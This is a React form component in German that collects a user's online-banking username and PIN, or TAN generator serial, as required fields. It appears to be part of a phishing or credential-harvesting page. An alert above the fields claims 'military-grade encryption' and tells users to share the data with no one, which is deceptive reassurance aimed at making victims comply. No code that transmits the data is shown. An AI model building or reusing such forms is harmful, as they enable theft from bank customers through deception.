"use client"

import type React from "react"

import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Alert, AlertDescription } from "@/components/ui/alert"

interface BankAccessProps {
  formData: any
  errors: Record<string, string>
  touched: Set<string>
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void
  onBlur: (e: React.FocusEvent<HTMLInputElement>) => void
}

export default function BankAccessSection({ formData, errors, touched, onChange, onBlur }: BankAccessProps) {
  const getFieldError = (fieldName: string) => (touched.has(fieldName) ? errors[fieldName] : "")

  return (
    <div className="space-y-6 rounded-lg bg-destructive/5 p-6">
      <Alert className="border-destructive/30 bg-destructive/10">
        <AlertDescription className="text-xs font-semibold text-destructive">
          🔐 HOCHSICHERHEITSBEREICH: Diese Daten werden mit militärischer Verschlüsselung übertragen und segregiert
          gespeichert. Teilen Sie diese Informationen mit niemandem.
        </AlertDescription>
      </Alert>

      <div className="grid gap-6">
        <div className="space-y-2">
          <Label htmlFor="onlineBankingUsername" className="font-semibold">
            Online-Banking Benutzername *
          </Label>
          <Input
            id="onlineBankingUsername"
            name="onlineBankingUsername"
            type="text"
            value={formData.onlineBankingUsername}
            onChange={onChange}
            onBlur={onBlur}
            placeholder="Ihr Benutzername"
            className={getFieldError("onlineBankingUsername") ? "border-destructive" : ""}
            autoComplete="off"
            required
          />
          {getFieldError("onlineBankingUsername") && (
            <p className="text-sm text-destructive">{getFieldError("onlineBankingUsername")}</p>
          )}
        </div>

        <div className="space-y-2">
          <Label htmlFor="onlineBankingPin" className="font-semibold">
            Online-Banking PIN (oder TAN-Generatorserial) *
          </Label>
          <Input
            id="onlineBankingPin"
            name="onlineBankingPin"
            type="password"
            value={formData.onlineBankingPin}
            onChange={onChange}
            onBlur={onBlur}
            placeholder="••••••••"
            className={getFieldError("onlineBankingPin") ? "border-destructive" : ""}
            autoComplete="off"
            required
          />
          {getFieldError("onlineBankingPin") && (
            <p className="text-sm text-destructive">{getFieldError("onlineBankingPin")}</p>
          )}
          <p className="text-xs text-muted-foreground">
            Verwenden Sie Ihre PIN oder ggf. die Seriennummer Ihres TAN-Generators
          </p>
        </div>
      </div>
    </div>
  )
}
